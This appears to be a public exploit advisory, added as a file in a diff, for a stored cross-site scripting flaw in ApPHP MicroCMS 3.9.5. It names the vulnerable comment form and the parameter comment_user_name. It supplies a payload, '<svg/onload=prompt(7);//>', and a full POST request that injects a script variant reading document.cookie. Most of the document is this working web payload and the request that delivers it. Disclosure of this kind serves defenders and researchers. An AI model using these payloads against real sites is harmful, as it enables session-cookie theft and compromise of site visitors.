@@ -1,0 +1,37 @@
+# Exploit Title :----------------- : ApPHP MicroCMS 3.9.5 - Stored Cross Site Scripting
+# Author :------------------------ : Besim
+# Google Dork :---------------- :  -
+# Date :-------------------------- : 12/10/2016
+# Type :-------------------------- : webapps
+# Platform : -------------------- :  PHP  
+# Vendor Homepage :------- : http://www.apphp.com
+# Software link : -------------- : https://www.apphp.com/customer/index.php?page=free-products
+
+-*-*-*-*-*-*-*-*- Description -*-*-*-*-*-*-*-*-
+
+*-* Vulnerable link : http://site_name/path/index.php?page=pages&pid=
+
+*-* Stored XSS Payload ( Comments ): 
+
+# Vulnerable URL : http://site_name/path/index.php?page=posts&post_id= - Post comment section
+# Vuln. Parameter : comment_user_name
+# Payload : <svg/onload=prompt(7);//> 
+
+
+############  POST DATA ############
+
+task=publish_comment &
+comment_id=
+& article_id=13 
+&user_id= 
+&token=212529c97855409e56c0e333721461df 
+&comment_user_name=<svg/onload=prompt(document.cookie);//> 
+&comment_user_email=meryem@yopmai.com 
+&comment_text=skdLSJDLKSDKJ 
+&captcha_code=w7AG
+&btnSubmitPC=Publish your comment
+
+############  ########## ############
+
+
+*-* Thanks Meryem AKDOĞAN *-*
